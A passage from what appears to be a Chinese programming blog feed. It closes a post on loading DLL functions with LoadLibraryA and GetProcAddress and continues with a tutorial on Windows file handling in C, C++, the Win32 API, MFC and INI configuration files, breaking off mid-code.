class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先肯定要自定义类型了，那么关键在于<code>extern &quot;C&quot;</code>和<code>_stdcall</code>要不要加的问题<br><code>extern &quot;C&quot;</code>其实是告诉编译器怎么编译它，那么编译完之后其实就不用管了。<br>但是<code>_stdcall</code>不一样，函数调用约定比较麻烦。所以<code>_stdcall</code>是必须的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(_stdcall *FAVE)</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>模板的形参名是可以省略的，有印象的话最好。<br>至于<code>_stdcall</code>，其实在之前写的线程进程的时候，有用到一个宏<code>WINAPI</code>，它本质上就是<code>_stdcall</code>。<br>所以这么写也没问题<code>typedef int(WINAPI *FAVE)(int);</code></p><img src="/2022/07/25/dynamiclink/008.png" class=""><p>效果也ok的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FAVE_1)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(_stdcall *FAVE)</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">FAVE_1 func = (FAVE_1)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave_1&quot;</span>);</span><br><span class="line">FAVE func1 = (FAVE)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (func)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;函数加载成功!\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">func</span>(<span class="number">200</span>, <span class="number">300</span>) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">func1</span>(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">FreeLibrary</span>(hMod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>关于动态库，其实还有挺多可以优化的地方，但现在了解为主吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows文件处理</title>
      <link href="/2022/07/23/windowsFiles/"/>
      <url>/2022/07/23/windowsFiles/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>windows常见的文件操作有日志、操作配置文件、ini、注册表、音视频的文件存储。<br>而linux系统具有一切皆文件的概念。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>c&#x2F;c++那会都是打开一个文件然后以什么模式，用完还要关闭。</p><hr><h2 id="c-x2F-c-win32-mfc文件操作"><a href="#c-x2F-c-win32-mfc文件操作" class="headerlink" title="c&#x2F;c++ win32 mfc文件操作"></a>c&#x2F;c++ win32 mfc文件操作</h2><h3 id="c文件操作"><a href="#c文件操作" class="headerlink" title="c文件操作"></a>c文件操作</h3><p><code>fopen</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_ACRTIMP FILE* __cdecl <span class="title">fopen</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_ <span class="type">char</span> <span class="type">const</span>* _FileName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_ <span class="type">char</span> <span class="type">const</span>* _Mode</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fopen_s</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_ACRTIMP <span class="type">errno_t</span> __cdecl <span class="title">fopen_s</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Outptr_result_nullonfailure_ FILE**      _Stream,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_                        <span class="type">char</span> <span class="type">const</span>* _FileName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_                        <span class="type">char</span> <span class="type">const</span>* _Mode</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fwrite</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_ACRTIMP <span class="type">size_t</span> __cdecl <span class="title">fwrite</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(_ElementSize * _ElementCount) <span class="type">void</span> <span class="type">const</span>* _Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_                                           <span class="type">size_t</span>      _ElementSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_                                           <span class="type">size_t</span>      _ElementCount,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_                                        FILE*       _Stream</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>带s一般都是所谓的安全函数</p><p>几种模式<code>_Mode</code></p><img src="/2022/07/23/windowsFiles/000.png" class=""><ol><li>a add</li><li>r read</li><li>w weite</li><li><ul><li>要求文件存在，权限估计也比较高</li></ul></li></ol><p>然后随便写个按钮绑定一下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//C 写文件</span></span><br><span class="line">FILE *pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);<span class="comment">//以写入模式打开文件</span></span><br><span class="line"><span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;文件打开失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;c language file&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fwrite</span>(szBuf, <span class="number">1</span>, <span class="built_in">strlen</span>(szBuf)+<span class="number">1</span>, pFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用完关闭</span></span><br><span class="line"><span class="built_in">fclose</span>(pFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/001.png" class=""><p>点击按钮之后文件夹目录就会多了这个1.txt，内容也是我们写的szBuf。<br>具体可以看文件创建时间是否符合我们刚才按下按钮的时候。</p><p>然后使用读文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//c 读文件</span></span><br><span class="line">FILE *pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;文件打开失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szbuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(szbuf, <span class="number">1</span>, <span class="number">1024</span>, pFile);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(pFile);</span><br><span class="line"><span class="built_in">MessageBox</span>(szbuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/002.png" class=""><p>实现起来也比较简单。</p><p>不过这里有个点要注意，因为读文件的时候文件不一定就写满了1024.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//c 读文件</span></span><br><span class="line">FILE *pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;文件打开失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szbuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//fseek 求文件的偏移量</span></span><br><span class="line"><span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">int</span> fLen = <span class="built_in">ftell</span>(pFile);<span class="comment">//等到文件指针的当前位置</span></span><br><span class="line"><span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_SET);<span class="comment">//前面的end会使指针跑到最后后面导致读数据都是空的</span></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(szbuf, <span class="number">1</span>, fLen, pFile);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(pFile);</span><br><span class="line"><span class="built_in">MessageBox</span>(szbuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要注意偏移之后要让指针回到起始位置。</p><hr><h3 id="c-文件操作"><a href="#c-文件操作" class="headerlink" title="c++文件操作"></a>c++文件操作</h3><p>c++是以类作为核心的语言，所以文件也通过一个类读写。<code>std::ofstream</code></p><p>使用前记得</p><blockquote><p>#include <fstream><br>using namespace std;</p></blockquote><p>不然没法用这个类。解锁命名空间也是为了写着方便</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//c++ 写</span></span><br><span class="line"><span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;2.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;c++ file edit&quot;</span>;</span><br><span class="line">ofs.<span class="built_in">write</span>(szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>);</span><br><span class="line">ofs.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写起来也非常简单</p><p>顺便把读文件也写了，到时候再看。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="comment">//c++ 读</span></span><br><span class="line"><span class="function">ifstream <span class="title">ifs</span><span class="params">(<span class="string">&quot;2.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ifs.<span class="built_in">read</span>(szBuf, <span class="number">1024</span>);</span><br><span class="line">ifs.<span class="built_in">close</span>();</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/003.png" class=""><p>效果自然是没啥问题的。</p><hr><h3 id="win32-api"><a href="#win32-api" class="headerlink" title="win32 api"></a>win32 api</h3><p>其实跟之前进程用到过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateFileW</span>(</span><br><span class="line">    _In_ LPCWSTR lpFileName,    <span class="comment">//创建或打开的对象名称</span></span><br><span class="line">    _In_ DWORD dwDesiredAccess, <span class="comment">//访问方式 读 写 查</span></span><br><span class="line">    _In_ DWORD dwShareMode,     <span class="comment">//共享方式 0</span></span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,    <span class="comment">//NULL 不能被进程继承</span></span><br><span class="line">    _In_ DWORD dwCreationDisposition,   <span class="comment">//如何创建文件NEW ALWAYS</span></span><br><span class="line">    _In_ DWORD dwFlagsAndAttributes,    <span class="comment">//设置文件属性</span></span><br><span class="line">    _In_opt_ HANDLE hTemplateFile       <span class="comment">//NULL</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>至于a和w就是多字节和Unicode的区别。</p><p>写文件的方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteFile</span>(</span><br><span class="line">    _In_ HANDLE hFile,</span><br><span class="line">    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,</span><br><span class="line">    _In_ DWORD nNumberOfBytesToWrite,</span><br><span class="line">    _Out_opt_ LPDWORD lpNumberOfBytesWritten,</span><br><span class="line">    _Inout_opt_ LPOVERLAPPED lpOverlapped</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>随便写写。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//win32 write</span></span><br><span class="line">HANDLE hFile;</span><br><span class="line">hFile = <span class="built_in">CreateFile</span>(<span class="string">&quot;3.txt&quot;</span>, GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, </span><br><span class="line">CREATE_NEW, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;创建文件对象失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;win32 api edit file&quot;</span>;</span><br><span class="line"><span class="built_in">WriteFile</span>(hFile, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//win32 read</span></span><br><span class="line">HANDLE hFile;</span><br><span class="line">hFile = <span class="built_in">CreateFile</span>(<span class="string">&quot;3.txt&quot;</span>, GENERIC_READ, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;创建文件对象失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, szBuf, <span class="number">1024</span>, &amp;dwRead, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/004.png" class=""><p>这里有点比较麻烦，就是write的时候，好像只能创建一次<br><code>hFile = CreateFile(&quot;3.txt&quot;, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);</code></p><p>其中<code>CREATE_NEW</code>就是新建的意思，但是如果存在了他就会报错，但改成其它的感觉又不太合适。先凑合用。</p><hr><h3 id="MFC"><a href="#MFC" class="headerlink" title="MFC"></a>MFC</h3><p>写法跟c++比较类似吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//mfc write</span></span><br><span class="line"><span class="function">CFile <span class="title">cf</span><span class="params">(<span class="string">&quot;4.txt&quot;</span>, CFile::modeCreate | CFile::modeWrite)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;mfc edit files&quot;</span>;</span><br><span class="line">cf.<span class="built_in">Write</span>(szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>);</span><br><span class="line">cf.<span class="built_in">Close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//mfc read</span></span><br><span class="line"><span class="function">CFile <span class="title">cf</span><span class="params">(<span class="string">&quot;4.txt&quot;</span>, CFile::modeRead)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">cf.<span class="built_in">Read</span>(szBuf, <span class="number">1024</span>);</span><br><span class="line">cf.<span class="built_in">Close</span>();</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/005.png" class=""><p>这样最基础的操作肯定是没问题的。</p><p>不过读文件好像还有别的骚操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//mfc read</span></span><br><span class="line"></span><br><span class="line"><span class="function">CFileDialog <span class="title">fileDlg</span><span class="params">(TRUE)</span></span>;</span><br><span class="line">fileDlg.m_ofn.lpstrTitle = <span class="string">&quot;Test&quot;</span>;</span><br><span class="line"><span class="comment">//过滤器</span></span><br><span class="line">fileDlg.m_ofn.lpstrFilter = <span class="string">&quot;Text Files(*.txt)\0*.txt\0All Files(*.*)\0*.*\0\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IDOK == fileDlg.<span class="built_in">DoModal</span>())&#123;</span><br><span class="line"><span class="function">CFile <span class="title">cf</span><span class="params">(fileDlg.GetFileName(), CFile::modeRead)</span></span>;</span><br><span class="line">DWORD dwFileLen = cf.<span class="built_in">GetLength</span>();</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">cf.<span class="built_in">Read</span>(szBuf, dwFileLen);</span><br><span class="line">cf.<span class="built_in">Close</span>();</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/006.png" class=""><p>点击读文件他会弹出一个文件夹让你选。<br>然后根据我们的过滤器，一种是text一种是all</p><img src="/2022/07/23/windowsFiles/007.png" class=""><p>随便打开其中一个都能读出来</p><img src="/2022/07/23/windowsFiles/008.png" class=""><hr><h2 id="配置文件的操作"><a href="#配置文件的操作" class="headerlink" title="配置文件的操作"></a>配置文件的操作</h2><p>配置文件的格式比较特殊，<code>.ini</code><br>里面一般都是配置选项。<br><code>WritePrivateProfileString</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WritePrivateProfileStringW</span>(</span><br><span class="line">    _In_opt_ LPCWSTR lpAppName,</span><br><span class="line">    _In_opt_ LPCWSTR lpKeyName,</span><br><span class="line">    _In_opt_ LPCWSTR lpString,</span><br><span class="line">    _In_opt_ LPCWSTR lpFileName</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>w和a就是对这些字符的要求不一样。</p><p>然后瞎写一个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//ini write</span></span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetCurrentDirectory</span>(MAX_PATH, szPath);</span><br><span class="line">CString szPathFile;</span><br><span class="line">szPathFile.<span class="built_in">Format</span>(<span class="string">&quot;%s\\Test.ini&quot;</span>, szPath);</span><br><span class="line"><span class="comment">//瞎写的。</span></span><br><span class="line"><span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;friend&quot;</span>, <span class="string">&quot;张三&quot;</span>, szPathFile);</span><br><span class="line"><span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;student&quot;</span>, <span class="string">&quot;李四&quot;</span>, szPathFile);</span><br><span class="line"><span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;school&quot;</span>, <span class="string">&quot;teacher&quot;</span>, <span class="string">&quot;王五&quot;</span>, szPathFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动之后点击写文件</p><img src="/2022/07/23/windowsFiles/009.png" class=""><p>可以在文件夹目录下看到我们写的配置。</p><p>至于读文件，也有点相似吧<br>要用到这个玩意</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetPrivateProfileStringW</span>(</span><br><span class="line">    _In_opt_ LPCWSTR lpAppName,</span><br><span class="line">    _In_opt_ LPCWSTR lpKeyName,</span><br><span class="line">    _In_opt_ LPCWSTR lpDefault,</span><br><span class="line">    _Out_writes_to_opt_(nSize, <span class="keyword">return</span> + <span class="number">1</span>) LPWSTR lpReturnedString,</span><br><span class="line">    _In_     DWORD nSize,</span><br><span class="line">    _In_opt_ LPCWSTR lpFileName</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>额，这里ini格式瞎写的，所以读出来的时候可能看着太怪了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ini read</span></span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetCurrentDirectory</span>(MAX_PATH, szPath);</span><br><span class="line">CString szPathFile;</span><br><span class="line">szPathFile.<span class="built_in">Format</span>(<span 